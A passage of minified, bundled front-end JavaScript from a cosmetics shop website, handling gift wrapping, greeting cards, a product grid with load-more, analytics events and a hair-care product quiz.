e,t,n;e=$(".js-click-image-to-zoom"),t=$(".js-how-to-use-image-zoomed"),n=$(".js-product-close"),e.on("click",(function(){t.hasClass("image-zoomed")?t.removeClass("image-zoomed"):t.addClass("image-zoomed"),o("zoom")})),n.on("click",(function(){t.removeClass("image-zoomed"),o("exit")}))}()}};t.exports=s},{"./modules/google":474}],453:[function(e,t,n){var r=e("./modules/google").tagManager;function i(){var e=$(".js-header-logo"),t=0<e.length&&e[0].href;return!!t&&t.includes("gifting")}function a(e,t){var n=JSON.parse(t.find('input[name="dataLayerProduct"]')[0].value),i={id:n.sku,name:n.name,price:n.price},a="image"==e?e:i.name;r.pushProductClickEvent(a,i,"fastlane gst","landing page")}var o={init:function(){i()&&($(document).off("click.gsfl",".js-product-tile-image").on("click.gsfl",".js-product-tile-image",(function(e){a("image",$(e.target).closest(".product-tile"))})),$(document).off("click.gsfl",".js-product-tile-details-content").on("click.gsfl",".js-product-tile-details-content",(function(e){a("text",$(e.target).closest(".product-tile"))})))},pushDataLayerEventForFAQBlock:function(e){if(e&&i()){var t={event:"gst",interaction:"expand",content_name:"faq",clickTarget:e};r.pushDataLayerEvent(t)}}};t.exports=o},{"./modules/google":474}],454:[function(e,t,n){var r=e("./rituals-styles"),i=e("./giftwrapping"),a=e("./greetingcard"),o=e("./dam/dam-helper"),s=e("./pages/checkout/taxFreeThresholdPassedWarning");t.exports=new function(){function e(e){if(e){var r=$(e).filter(".js-giftwrap-updated-info");!function(e){var t=$(".js-order-totals-info",e);if(t.length){var n=t.find(".js-order-subtotal-value");n.length&&$(".js-order-subtotal-value").html(n.html());var r=t.find(".js-order-value");r.length&&$(".js-order-value").html(r.html());var i=t.find(".js-tax-warning-block");i.length&&($(".js-tax-warning-block").html(i.html()),s.createDialog())}}(r),n(r,".js-giftwrapping-info",".js-giftwrap"),n(r,".js-greetingcard-info",".js-greetingcard"),t(r,".js-gift-wrapping-line-item",".js-cart-giftwrapping-row"),t(r,".js-greetingcard-line-item",".js-cart-greetingcard-row")}}function t(e,t,n){var r=$(t,e);if(r.length){var i=$(".js-cart-items"),a=$(n,i);return a.length?(a.replaceWith(r.html()),void o.updateImages($(n,i))):(i.append(r.html()),void o.updateImages(i))}}function n(e,t,n){var r=$(t,e);r.length&&($(n).replaceWith(r.html()),o.updateImages($(n)))}function l(t,n,i){$.ajax({type:"POST",url:Urls.enableOrDisableGiftWrap,data:"enable="+t+"&rewrap="+n,success:function(t){e(t),a.onloadSetSelectedCard(),$(".js-lazy-load").length&&r.initLazyLoad(),i&&$.isFunction(i)&&i()}})}return{init:function(){i.init(e),a.init(e)},getGiftwrapDataForSelectedShippingOption:function(e,t,n,r){$.ajax({type:"POST",url:Urls.getGiftwrapDataForSelectedShippingOption,contentType:"application/json",data:JSON.stringify({shippingOption:e,page:t})}).done((function(e){var i,a,o,s;e&&e.giftWrapData?e.giftWrapData.showGiftWrapMessage?(i=t,a=function(){l(e.giftWrapData.enable,e.giftWrapData.rewrap,r)},o=n,s=e.giftWrapData.giftWrapModalText,window.eventBus.$emit("shouldOpenModal",{resources:{heading:window.Resources.GIFTWRAP},paragraphs:[{text:s}],ctaHolder:{},buttons:[{type:"btn",label:window.Resources.CONTINUE,eventName:"onGiftWrapModalPrimaryButtonClick",shouldCloseModal:!0}],closeElement:{eventName:"onGiftWrapModalCloseElementClick",shouldCloseModal:!0},modalLarge:!0,centerOnMobile:!0}),window.eventBus.$off("onGiftWrapModalPrimaryButtonClick"),window.eventBus.$off("onGiftWrapModalCloseElementClick"),window.eventBus.$once("onGiftWrapModalPrimaryButtonClick",(function(){a&&a()})),window.eventBus.$once("onGiftWrapModalCloseElementClick",(function(){a&&"checkout_page"!==i?a():o&&o.prop("checked",!0)}))):l(e.giftWrapData.enable,e.giftWrapData.rewrap,r):r&&$.isFunction(r)&&r()}))}}}},{"./dam/dam-helper":430,"./giftwrapping":455,"./greetingcard":457,"./pages/checkout/taxFreeThresholdPassedWarning":546,"./rituals-styles":608}],455:[function(e,t,n){var r=e("./flyout"),i=e("./rituals-styles"),a=e("./dam/dam-helper"),o=e("./modules/google").tagManager;t.exports=new function(){var e=!0,t=!1,n="individual";return{init:function(s){function l(){h("none")}function c(t){e=!0,(t||this.checked)&&($(".js-giftwrap-edit").hide(),h("together"))}function u(){t=e=!1;var i=$("#giftwrap-container"),a=i.data("wrapinfo"),o={products:[]};for(var s in a.products)o.products.push({id:a.products[s].id,plid:a.products[s].plid,qty:i.find("input[name=gift-wrapped-product][value="+a.products[s].id+a.products[s].plid+"]:checked").length});h(n,o,(function(){r.closeFlyouts()}))}function d(){var n=0<$(".checkout-v3").length;r.load({url:Urls.giftWrapShowProducts,open:function(){var e=$("#giftservice-products");a.updateImages(e);var t=$(".js-giftwrap-save"),i=e.find("input[name=gift-wrapped-product]:checked").length;n&&$(".js-generic-flyout").addClass("checkout-v3"),$(".js-generic-flyout").addClass("giftwrap-flyout"),$(".js-giftwrap-cancel").on("click",(function(){r.closeFlyouts()})),t.on("click",u);var o=e.find("input[name=gift-wrapped-product]:checked").length===e.find("input[name=gift-wrapped-product]").length;$("#checkall").prop("checked",o),e.on("change",e.find("input[name=gift-wrapped-product]"),(function(){var t=e.find("input[name=gift-wrapped-product]:checked").length===e.find("input[name=gift-wrapped-product]").length;$("#checkall").prop("checked",t),p(i)})),$("#checkall").on("change",(function(){e.find("input[name=gift-wrapped-product]").prop("checked",!!this.checked),p(i)}));var s=0===e.find("input[name=gift-wrapped-product]:checked").length;t.prop("disabled",s),$(".js-generic-flyout ").find(".js-close-flyout").prependTo("#giftwrap-container .giftwrap-title")},close:function(){e&&!$("#wrap-together").prop("disabled")&&($(".js-giftwrap-edit").hide(),$("#wrap-together").prop("checked",!0)),t&&($(".js-giftwrap-checkbox").prop("checked",!1),$(".js-giftwrap-options").removeClass("enabled"),t=!1),setTimeout((function(){n&&$(".js-generic-flyout").removeClass("checkout-v3"),$(".js-generic-flyout").removeClass("giftwrap-flyout"),$("#giftwrap-container .giftwrap-title").find(".js-close-flyout").prependTo(".js-generic-flyout")}),1e3)}})}function p(e){var t=$("#giftservice-products"),n=$(".js-giftwrap-save"),r=0===t.find("input[name=gift-wrapped-product]:checked").length&&0===e;n.prop("disabled",r)}function h(e,t,r){var i="wrapType="+e;t&&e==n&&(i+="&giftwrap_data="+JSON.stringify(t)),$.ajax({type:"POST",url:Urls.wrapProductsOrClearGiftWrapping,data:i,success:function(e){s(e),r&&$.isFunction(r)&&r(),f(),function(){var e=$(".js-giftwrap-data-layer");if(e&&e.length){var t=e.data("data-layer");t&&o.pushDataLayerEvent(JSON.parse(JSON.stringify(t)))}}()}})}function f(){$(".js-lazy-load").length&&i.initLazyLoad()}$(document).on("change",".js-giftwrap-checkbox",(function(){var n=$(this);if(n.prop("checked")){var r=$("#wrap-individual");if(r.length&&r.prop("checked"))return n.prop("checked",!0),$(".js-giftwrap-options").addClass("enabled"),t=!(e=!1),void d();var i=$("#wrap-together");!i.length||!i.prop("checked")&&i.prop("disabled")||c(!0)}else l()})),$(document).on("click","#wrap-together",c),$(document).on("click","#wrap-individual",(function(){e=!0,this.checked&&($(".js-giftwrap-edit").show(),d(),f())})),$(document).on("click",".js-giftwrap-edit",(function(){$("#wrap-individual").prop("checked",!0),d(),e=!1})),$(document).on("click",".js-remove-gift-wrapping",(function(e){e.preventDefault(),e.stopPropagation(),l()}))}}}},{"./dam/dam-helper":430,"./flyout":447,"./modules/google":474,"./rituals-styles":608}],456:[function(e,t,n){var r=e("./modules/google").tagManager;function i(){var e=$(".js-header-logo"),t=0<e.length&&e[0].href;return!!t&&t.includes("greenfriday")}var a={pushDataLayerData:function(e,t,n){if(e&&t&&n&&i()){var a={event:"green_friday",event_category:e,event_action:t,event_label:n};r.pushDataLayerEvent(a)}},pushDataLayerDataForFAQBlock:function(e){if(e&&i()){var t={event:"green_friday",event_category:"faq",event_action:"click faq",event_label:e};r.pushDataLayerEvent(t)}}};t.exports=a},{"./modules/google":474}],457:[function(e,t,n){var r=e("./rituals-styles"),i=e("./modules/google").tagManager;t.exports=new function(){function e(){var e=$(".js-greetingcard-select-card");if(e.length){var t=$(".js-gift-wrapping-card-multiple-option");if(t.length){var n=e.data("selectedcardid"),r=void 0!==n&&n?t.filter("#"+n):t.first();r.addClass("selected"),e.data("selectedcardid",r.attr("id")),e.data("selectedcardurl",r.find("img").attr("src")||r.find("img").data("src"))}}}function t(){var e=$(".js-personal-message-textarea");$.ajax({url:Urls.validateGreetingCardText,type:"POST",data:{greetingCardText:e.val()},success:function(t){if(a(e),t.error)return n(e,t.reason),void s(".js-greetingcard-add",!0);s(".js-greetingcard-add",!1)}})}function n(e,t){e.removeClass("error").parent().parent().find("span.error").remove(),e.removeClass("valid").addClass("error").parent().before($("<span/>").addClass("error").text(t))}function a(e){e.removeClass("error").parent().parent().find("span.error").remove()}function o(e,t){var n=$(e);if(n.length){if(t)return n.addClass("btn--disabled").addClass("button-loading"),void n.find(".js-spinner-general").addClass("spinner-visible");n.removeClass("btn--disabled").removeClass("button-loading"),n.find(".js-spinner-general").removeClass("spinner-visible")}}function s(e,t){$(e).prop("disabled",t)}return{init:function(l){var c;$(document).on("click",".js-greetingcard-checkbox",(function(){if(!(0<$(".js-greetingcard-edit").length))return $(this).prop("checked")?($(".js-greetingcard-options").closest(".js-greetingcard").addClass("enabled"),void $(".js-greetingcard-options").show().trigger("cardSelected",[{selectedCard:u()}])):($(".js-greetingcard-options").closest(".js-greetingcard").removeClass("enabled"),void $(".js-greetingcard-options").hide());p()})),$(document).on("click",".js-greetingcard-cancel",(function(){$(".js-greetingcard-edit").length?$(".js-greetingcard-options").hide():$(".js-greetingcard-checkbox").click()})),$(document).on("click",".js-greetingcard-add",(function(){var t,r,i=$(".js-personal-message-textarea");a(i),o(".js-greetingcard-add",!0),$.ajax({type:"POST",url:Urls.greetingCardAdd,data:(t={cardText:$(".js-personal-message-textarea").val(),cardId:"",cardImgUrl:""},r=$(".js-greetingcard-select-card"),r.length&&(t.cardId=r.data("selectedcardid"),t.cardImgUrl=r.data("selectedcardurl")),t),success:function(t){l(t),e(),h(),o(".js-greetingcard-add",!1)},error:function(e){if(400===e.status){o(".js-greetingcard-add",!1);var t=e.responseJSON;if(t.error)return n(i,t.reason),void s(".js-greetingcard-add",!0)}}})})),$(document).on("click",".js-greetingcard-edit",(function(){var e=$(".js-greetingcard-checkbox");e.is(":checked")||e.prop("checked",!0),$(".js-greetingcard-options").show()})),$(document).on("click",".js-remove-greetingcard",(function(e){e.preventDefault(),e.stopPropagation(),p()})),$(document).on("click",".js-gift-wrapping-card-multiple-option",(function(){d($(this))})),$(document).on("keydown",".js-gift-wrapping-card-multiple-option",(function(e){32===e.which&&(e.preventDefault(),d($(this)))})),$(document).on("cardSelected",".js-greetingcard-options",(function(e,t){!function(e){if(e&&e.length){var t=e.find(".js-card-name");t.length&&i.pushDataLayerEvent({event:"add_card",interaction:"click",card_selection:t.html()})}}(t.selectedCard)})),e(),c=".js-personal-message-textarea",$(document).on("scroll",c,(function(){var e=$(this).scrollTop();$(".js-textarea-lines").css("margin-top","-"+e+"px")})),$(document).on("keypress paste",c,(function(){var e,t;e=this,t=$(this).val(),setTimeout((function(){1<e.scrollHeight-e.clientHeight&&$(e).val(t)}),1)})),$(document).on("blur",c,(function(){t()})),$(document).on("keyup paste",c,(function(){var e=$(this);!function(e){for(var t in e){if("\ud800"<=e[t])return!0}return!1}(e.val())?(a(e),s(".js-greetingcard-add",!1)):t()})),$(document).on("input paste",c,(function(){var e=$(this),t=e.attr("maxlength")-e.val().length;$(".js-char-left").html(t)}));var u=function(){var e=$(".js-greetingcard-select-card");return e.length?e.find(".selected"):null};function d(e){if(e.length){var t=e.attr("id"),n=e.find("img").attr("src"),r=$(".js-gift-wrapping-card-multiple-option");r.removeClass("selected");var i=r.filter("#"+t);i.addClass("selected").trigger("cardSelected",[{selectedCard:i}]);var a=$(".js-greetingcard-select-card");a.data("selectedcardid",t),a.data("selectedcardurl",n)}}function p(){$.ajax({type:"POST",url:Urls.greetingCardRemove,success:function(t){l(t),e(),h()}})}function h(){$(".js-lazy-load").length&&r.initLazyLoad()}},onloadSetSelectedCard:e}}},{"./modules/google":474,"./rituals-styles":608}],458:[function(e,t,n){var r=e("./modules/helpers/debounce"),i=e("./modules/helpers/equalHeight"),a=e("./modules/helpers/isSmallView"),o=e("./modules/helpers/prepareDeferedImages"),s=e("./modules/helpers/scroll"),l=e("masonry-layout"),c=e("scrollreveal"),u=e("./modules/util/generateUniqueGuid"),d=e("./modules/util/updateQueryStringParameter"),p=e("./modules/util/getQueryParameter"),h=e("./dam/dam-helper"),f=".js-grid-wrap",A=".js-grid-item",m=".js-reveal-tile",v=[500,1500,2500,3500],g=["10px","20px","30px","40px"],y=new Map,b=0,_="search"==window.pageContext.ns,w=e("./scrollAnimation"),C=e("./product-grid"),x=e("./bundle-variation-swatches"),S=[".js-grid-wrap:not(.js-grid-slider) .js-grid-item:not(.js-block-tile)",".drag-list-body .js-drag-list-item"];function k(){var e=$(window).width();return 768<=e&&e<=825}function M(){var e=$(window).width();return 826<=e&&e<=1024}function B(e){var t,n=$(e)[0],r=new l(n,{columnWidth:A,gutter:(t=$(n),t.hasClass("js-question-grid")||t.hasClass("js-grid-account")?20:t.hasClass("js-search-grid")&&a()?8:a()?10:t.hasClass("js-search-grid")&&k()?24:t.hasClass("js-search-grid")&&M()?18:t.parents(".js-product-grid-block").length&&k()?30:t.parents(".js-product-grid-block").length&&M()?40:60),itemSelector:A,isFit:!0,percentPosition:!0,stagger:"0.1s",transitionDuration:0,stamp:".js-fixed-item"});$(n).addClass("grid-initialized");var i=u();return $(e).data("msnry-id",i),y.set(i,r),r}function E(e,t){window.sr?window.sr.destroy():window.sr=c(),t.find(e).each((function(e,t){sr.reveal(t,{distance:T(g),duration:T(v),easing:"cubic-bezier(0.05, 0.65, 0.3, 1)",opacity:.2,scale:1,viewFactor:.2})}))}function T(e){return e[Math.floor(Math.random()*e.length)]}function P(){$(A+" .js-out-of-stock-wrap:not(.hide)").each((function(){$(this).parents(".js-product-user-actions").addClass("form-wide")}))}var I={init:function(){b=$(".js-product-tile").length,$(document).on("click",".js-product-tile",(function(){!function(){window.history.state||window.history.pushState({},"",window.location.href);var e=window.history.state;e.scrollYPosition=window.scrollY,window.history.replaceState(e,"",window.location.href)}()})),$(f).length&&$(f).each((function(e){var t=$(this);if(0===t.html().trim().length)return!0;t.hasClass("js-grid-slider")&&a()||(h.updateImages(t),o(t),i($(".js-equal-height",this)),t.imagesLoaded((function(){$(".js-grid-initial-load-spinner").removeClass("spinner-visible"),$(".js-grid-product-number").removeClass("grid-number-hidden"),function(){var e=$(".js-gwp-grid-item");e.length&&!$(".js-gwp-banner",e).length&&e.remove()}(),(!t.hasClass("js-question-grid")||t.hasClass("js-question-grid")&&!a())&&function(e){B(e);var t=a()?f+":not(.js-grid-slider)":f,n=$(t).filter((function(){return 0!==$.trim($(this).html()).length}));n.length===$(".grid-initialized").length&&n.each((function(){E(m,$(this))})),"banner-video-animation"!==$(".js-scroll-animation-wrapper").data("animation-type")&&w.init(),C.pushProductsToDataLayer(S)}(t),D(),window.history.state&&window.history.state.scrollYPosition&&(window.scrollTo(window.scrollX,window.history.state.scrollYPosition),window.history.state.gridItemCount=null,window.history.state.scrollYPosition=null)}))),$(this).find(".js-product-name-link").attr("tabindex","-1")})),P(),_&&history.state&&history.state.loaded&&history.state.offset&&window.performance&&window.performance.navigation.type==window.performance.navigation.TYPE_BACK_FORWARD&&(s.disableScroll(),F(null,history.state.loaded,(function(){s.enableScroll(),$("html, body").scrollTop(history.state.offset),$(".js-grid-load-more").data("grid-next-page-url",history.state.loadurl),"banner-video-animation"!==$(this).data("animation-type")&&w.init(),$(".js-scroll-animation-wrapper").each((function(){var e=$(this);"candle-holder"===e.data("animation-type")&&$("img",e).each((function(e,t){var n=a()?$(t).data("mobile-img"):$(t).data("desktop-img");$(t).attr("src",n)}))}))}))),function(){var e=$("[id^=cq_recomm]");e.length&&e.find(f)&&$("[id^=cq_recomm]").each((function(e,t){var n=$(t)[0],r=new MutationObserver((function(){h.updateImages(n),o(n),$(n).imagesLoaded((function(){$(n).find(f).each((function(e,t){B(t),E(m,$(t))})),D(),$(".js-grid-spinner").length&&$(".js-grid-spinner").removeClass("spinner-visible")})),$(document).trigger("recommendation-grid-loaded"),r.disconnect()}));r.observe(n,{childList:!0,subtree:!0})})),($(f).length||e.length||$(".js-grid-placeholder").length)&&$(window).off("scroll.grid").on("scroll.grid",r((function(){C.pushProductsToDataLayer(S)}),300))}(),x.init()},getContainers:function(){return y},updateLoadMoreUrl:N,updateProductsSeenAndTotalNumbers:L,appendNewElements:O,reinitGridLayout:function(e){var t=e?y.get(e):y.values().next().value;t&&t.layout()}};function F(e,t,n){var r=$(".js-grid-load-more");e&&(r=$(e.target));var i=r.data("grid-next-page-url")||Urls.productPartialGrid,a=r.data("grid-next-page-url"),s=r.data("ritual"),l=r.data("start-index"),c=r.data("end-index"),u=r.data("page-size"),f=r.data("is-search");if(t&&b<t)i=d(i,"sz",u=t-b);else if(!e)return void n();var A=p(i,"format"),m="collection-product-grid"!==r.parents("section").data("anchor-id")||a?p(i,"source"):"collection",v={ritual:s,start:l,isSearch:f,source:m};A||(v.format="ajax"),$.ajax({type:"GET",url:i,data:v,success:function(t){if(t){var i=$(t);i.addClass("js-reveal-tile-new");var s=r.parent().prev(':data("msnry-id")');s.append(i);var d=s.find(i.filter(".js-reveal-tile"));h.updateImages(d),o(d),d.imagesLoaded((function(){O(i,s,e),n(),$(".js-grid-load-more-spinner").removeClass("spinner-visible"),r.removeClass("button-loading"),L()})),a?N(r):(c<=l+u&&$(".js-grid-load-more-holder").hide(),r.data("start-index",l+u),r.removeAttr("disabled")),P(),function(){var e=window.history.state;if(e){var t=$(".js-filtered-grid-placeholder").data("page-size");e.gridItemCount=e.gridItemCount?e.gridItemCount+t:t,window.history.replaceState(e,"",window.location.href)}}()}}})}function L(){var e=$(".js-products-seen-text");if(e.length){$(".js-products-seen").text(e.val()),e.remove();var t=$(".js-total-products-text");t.length&&($(".js-total-products").text(t.val()),t.remove())}}function O(e,t,n){var r=t.data("msnry-id"),i=y.get(r);i&&(i.once("layoutComplete",(function(){E($(".js-reveal-tile",t),t),n&&0===n.screenX&&e.find(".js-product-tile").eq(0).focus(),C.pushProductsToDataLayer(S)})),i.appended(e))}function N(e){var t=e||$(".js-grid-load-more");t.removeAttr("disabled");var n=$(".js-next-product-grid-page-url");if(window.history.state||window.history.pushState({},"",window.location.href),0<n.length)return t.data("grid-next-page-url",n.last().val()),$(".js-grid-load-more-holder").show(),void n.remove();$(".js-grid-load-more-holder").hide()}function D(){if(void 0!==y){var e,t=_createForOfIteratorHelper(y);try{for(t.s();!(e=t.n()).done;){var n=_slicedToArray(e.value,2),r=(n[0],n[1]);r.layouted||(r.layout(),r.layouted=!0)}}catch(e){t.e(e)}finally{t.f()}}}var R=!1;function j(){if(!R){R=!0;var e=$(".js-product-tile").length,t=$(document).scrollTop(),n=$(".js-grid-load-more").data("grid-next-page-url"),r=history.state?history.state:{};r.loaded=e,r.offset=t,r.loadurl=n||"",history.replaceState(r,"",location.href)}}$(document).on("click",".js-grid-load-more",(function(e){e.preventDefault(),$(this).attr("disabled",!0),F(e,0,(function(){"banner-video-animation"!==$(".js-scroll-animation-wrapper").data("animation-type")&&w.init()})),$(".js-grid-load-more-spinner").addClass("spinner-visible"),$(this).addClass("button-loading")})),$(window).on("load",D),_&&($(window).on("beforeunload",j),$(window).on("unload",j),$(document).on("pagehide",j)),t.exports=I},{"./bundle-variation-swatches":294,"./dam/dam-helper":430,"./modules/helpers/debounce":476,"./modules/helpers/equalHeight":477,"./modules/helpers/isSmallView":487,"./modules/helpers/prepareDeferedImages":492,"./modules/helpers/scroll":493,"./modules/util/generateUniqueGuid":503,"./modules/util/getQueryParameter":507,"./modules/util/updateQueryStringParameter":530,"./product-grid":593,"./scrollAnimation":609,"masonry-layout":225,scrollreveal:267}],459:[function(e,t,n){var r,i,a,o,s,l,c,u,d,p=e("./modules/ajax"),h=e("./rituals-styles"),f=e("./responsive-background"),A=e("./grid"),m=e("./video"),v=e("./modules/google"),g=e("./slick-slider"),y=e("./product-slider"),b=e("./modules/helpers/isSmallView"),_=e("./product-filter"),w=e("./pages/collection/collection-ingredients"),C=e("./product-description"),x=e("./dragList"),S=!1,k=[],M=0,B=1;function E(e){var t,n=$(".js-option-block.selected"),r=".js-default-responsive-bg",o=".js-question-responsive-bg",s=$(r).prev(o);if(a&&n.length>a-1&&!e.hasClass("selected")&&(n.first().removeClass("selected"),n.first().find(".round-select-box").attr("aria-checked","false")),e.hasClass("selected")?(e.removeClass("selected"),e.find(".round-select-box").attr("aria-checked","false"),s.length&&$(r).fadeIn(400,(function(){s.remove()}))):(e.addClass("selected"),e.find(".round-select-box").attr("aria-checked","true"),e.find(o).length?s.length?(e.find(o).clone().prependTo($(r).parent()),s.fadeOut(400,(function(){s.remove()}))):(e.find(o).clone().insertBefore(r),$(r).fadeOut(400)):s.length&&$(r).fadeIn(400,(function(){s.remove()}))),(t=$(".js-option-block.selected")).length>=i&&(!a||t.length<=a)?$(".js-next-question, .js-quiz-last-question").removeAttr("disabled"):$(".js-next-question, .js-quiz-last-question").attr("disabled","disabled"),e.hasClass("selected")&&e.has(".js-option-extra-info")){var l=e.find(".js-option-extra-info").html();$(".js-option-extra-info-target").html(l)}else $(".js-option-extra-info-target").empty()}function T(e){var t=$(".js-gst-wrapper");p.load({url:e,target:t,data:{nocontainer:!0},replaceTarget:!0,callback:function(){var e;j(),P(),S&&(function(){var e,t,n=(e=o,(t=k.filter((function(t){return t.questionNo==e})))?t[0]:null);n&&null===n||$.each(n.selectedOptions,(function(e,t){$(".js-option-block").filter((function(){$(this).data("block-no")==t.blockNo&&E($(this))}))}))}(),e=o,k=k.filter((function(t){return t.questionNo!=e})),S=!1),h.initLazyLoad(),O(),D(),function(){var e=$(".js-view-results");if(0<e.length){var t=String.format("{0}?elixirIds={1}&shampooId={2}&conditionerId={3}&customerName={4}&productIds={5}&startPage={6}",Urls.hairTempleLanding,d.elixirIds,d.shampooId,d.conditionerId,d.customerName,d.productIds,c);e.attr("href",t)}}(),$("html, body").animate({scrollTop:$(".js-gst-wrapper").offset().top-$(".js-header-wrapper").height()-20},200),window.history.replaceState({},"",this.url),f.init(),U(),z(),0<$(".js-expand-description-link").length&&C.init(),0<$(".js-collection-ingredients").length&&w.init(),0<$(".js-grid-wrap").length&&A.init(),0<$(".quiz-loader").length&&m.initGeneric(),0<$(".js-product-slider-steps").length&&(g.init(),y.init(),m.initGeneric()),0<$(".js-pdp-images-slider").length&&g.init(),0<$(".js-drag-list").length&&x.init(),0<$(".js-product-filter-block").length&&_.init(),$(document).find(".js-content-banner-blurred").length?($(".js-content-banner-blurred .js-responsive-bg").addClass("blurred"),$(".js-quiz-main-content").addClass("visible")):$(document).find(".js-content-banner:not(.js-content-banner-blurred").length&&$(".js-quiz-main-content").addClass("visible")}})}function P(){var e=$(".js-question").data("question-config");e&&(r=e.numberOfAcceptedAnswers?e.numberOfAcceptedAnswers:null,a=r?i=r:(i=e.minAcceptedAnswers?e.minAcceptedAnswers:1,e.maxAcceptedAnswers?e.maxAcceptedAnswers:null));var t=$(".js-progress-bar").data("bar-config");o=t&&t.currentQuestion?parseInt(t.currentQuestion):1}function I(){var e=[];return $(".js-option-block.selected").each((function(){var t=$(this),n={type:t.data("option-type"),blockNo:t.data("block-no"),dataWeight:t.data("weight"),productIds:t.data("product-ids"),shampooId:t.data("shampoo-id"),conditionerId:t.data("conditioner-id")};e.push(n)})),e}function F(){var e=I();0!=e.length&&(k.push({questionNo:o,selectedOptions:e}),function(){var e=$(".js-gst-wrapper .js-question");if(e.length){var t=e.find(".top-wrapper .heading-h3").text().trim(),n=$.map($(".js-gst-wrapper .js-question .js-option-block.selected"),(function(e){return $(e).data("option-text-value")}));L()===B&&v.pushDataLayerEvent({event:"hairTempleSelection",eventCategory:"Hair Temple",eventAction:t,eventLabel:n.join("|")})}}())}function L(){return 0<$(".js-hairtemple-quiz").length?B:M}function O(){var e=$(".js-progress-bar");0<e.length&&e.each((function(e,t){for(var n=$(t),r=0;r<u;r++){var i=$("<div>",{class:"step"});if(r<o&&(i.addClass("completed"),r==o-1)){var a=n.siblings(".js-question").find(".title").text(),s=$("<div>",{class:"current-step-label"}).text(a);i.append(s)}r==u&&i.addClass("last");var l=n.find(".js-finish-label");i.insertBefore(l)}n.css("display","flex")}))}function N(){$(".js-quiz-container .js-responsive-bg").length&&($(".js-content-banner-blurred").length?setTimeout((function(){$(".js-content-banner-blurred .js-responsive-bg").addClass("blurred").delay(500).queue((function(){$(".js-quiz-main-content").addClass("visible"),$(this).dequeue()}))}),1e3):($(".js-quiz-main-content").addClass("visible"),$(this).dequeue()))}function D(){0<$("input[name=PersonalizedName]").length&&$("body").on("input","input[name=PersonalizedName]",(function(){var e,t=$(this),n=$(".js-quiz-last-question"),r=parseInt(t.attr("maxlength")),i=t.nextAll(".js-charnumber");if(t.val().length,t.valid())return i.text(r-t.val().length),void n.removeAttr("disabled");e=r-t.val().length,i.text(e<0?0:e),n.attr("disabled","disabled")}))}var R=/ /g;function j(){var e=$(".js-gst-wrapper .js-question");if(e.length){var t=e.find(".top-wrapper .heading-h3").text().trim(),n=window.location.pathname.split("/")[1];L()===B&&v.pushDataLayerEvent({event:"hairTemplePage",virtualURL:"/"+n+"/hair-temple/"+t.replace(R,"-").toLowerCase(),virtualTitle:"Hair Temple - "+t})}}function U(){$(".js-option-block").length&&$(".js-option-block").each((function(){var e=$(this),t=e.find(".round-select-box"),n=e.find(".option-text").html();t.attr("role","checkbox").attr("aria-checked","false"),t.parent().append('<span class="sr-only">'+n+"</span>")}))}function z(){var e=$(".js-nav-container");if(b()&&e.length){var t=$(".js-nav-container-inner").outerHeight();e[0].getBoundingClientRect().top+t+20<$(window).outerHeight()?e.removeClass("sticky-buttons"):e.addClass("sticky-buttons")}}var H={init:function(){var e;j(),N(),$(document).on("click",".js-option-block",(function(){E($(this))})),$(document).on("click",".js-retake-quiz",(function(){k=[]})),$(document).on("click",".js-start-quiz, .js-next-question",(function(e){e.preventDefault(),$(e.target).attr("disabled")||($(e.target).hasClass("js-next-question")&&F(),T(1===I().length&&$(".js-option-block.selected").data("link-to")||$(e.target).attr("href")))})),$(document).on("click",".js-prev-question",(function(e){e.preventDefault(),$(e.target).attr("disabled")||(S=!0,T($(e.target).attr("href"))),N()})),$(document).on("click",".js-quiz-last-question",(function(e){e.preventDefault(),F(),function(){var e,t,n=null;switch(L()){case M:d=function(){if(0!=k.length){var e={};$.each(k,(function(t,n){$.each(n.selectedOptions,(function(t,n){var r=n.type.split(",");$.each(r,(function(t,n){e[n]=(e[n]||0)+1}))}))}));var t=null;for(var n in e)Object.prototype.hasOwnProperty.call(e,n)&&(null===t||e[n]>e[t])&&(t=n);return t}}(),n=s+"-"+d+".html";break;case B:d=function(){if(0!=k.length){var e={elixirIds:[],customerName:$("input[name=PersonalizedName]").val(),shampooId:null,conditionerId:null,productIds:[]},t={};$.each(k,(function(n,r){$.each(r.selectedOptions,(function(n,r){r.dataWeight?t[r.type]?t[r.type]+=parseInt(r.dataWeight):t[r.type]=parseInt(r.dataWeight):r.productIds?e.productIds=e.productIds.concat(r.productIds.toString().split(",")):(r.shampooId||r.conditionerId)&&(e.shampooId=r.shampooId,e.conditionerId=r.conditionerId)}))}));var n,r=(n=t,Object.keys(n).map((function(e){return{elixirId:e,value:n[e]}})).sort((function(e,t){return Number(t.value)-Number(e.value)})));return e.productIds=$.unique(e.productIds.map((function(e){return $.trim(decodeURIComponent(e))}))),e.elixirIds.push(r[0].elixirId),e.elixirIds.push(r[1].elixirId),e}}(),n=l+".html"}e=n,T(t=(t=window.location.href).replace(t.substr(t.lastIndexOf("/")+1),e))}()})),$(document).on("click",".js-more-info-toggle",(function(){$(".js-content-banner").toggleClass("showing-more-info")})),$(document).on("keydown",".js-more-info-toggle",(function(e){13!=e.which&&32!=e.which||(e.preventDefault(),$(this).trigger("click"))})),$(document).on("keydown",".js-option-block",(function(e){13!=e.which&&32!=e.which||(e.preventDefault(),$(this).trigger("click"))})),$(document).on("keydown",".js-question input[type=text]",(function(e){13==e.which&&(e.preventDefault(),$(".js-question .js-next-question,.js-quiz-last-question").trigger("click"))})),U(),$(window).on("load scroll",(function(){z()})),$(window).on("load",(function(){0<$(".js-collection-ingredients").length&&w.init()})),(e=$(".js-quiz-container").data("quiz-config"))&&(s=e.quizNamePrefix?e.quizNamePrefix:"",l=e.hairTempleLoadingPage?e.hairTempleLoadingPage:"",c=e.startPage?e.startPage:"",u=e.totalQuestions?parseInt(e.totalQuestions):0),P(),O(),D()}};t.exports=H},{"./dragList":434,"./grid":458,"./modules/ajax":470,"./modules/google":474,"./modules/helpers/isSmallView":487,"./pages/collection/collection-ingredients":547,"./product-description":591,"./product-filter":592,"./product-slider":595,"./responsive-background":604,"./rituals-styles":608,"./slick-slider":614,"./video":625}],460:[function(e,t,n){var r=e("promise"),i={def:{$welcomeBannerElement:null,$welcomeBannerContentElements:null,$welcomeInnerBannerElement:null,$approachingDiscountElements:null,$welcomeOverlayElement:null,delay:4e3},init:function(e){i.def.$welcomeBannerElement=e.$parentElement.find(".js-gwp-welcome-banner"),i.def.$welcomeBannerContentElements=e.$parentElement.find(".gwp-welcome-banner-title, .gwp-welcome-banner-content"),i.def.$welcomeInnerBannerElement=e.$parentElement.find(".js-gwp-welcome-banner-inner"),i.def.$approachingDiscountElements=e.$parentElement.find(".js-approaching-discount, 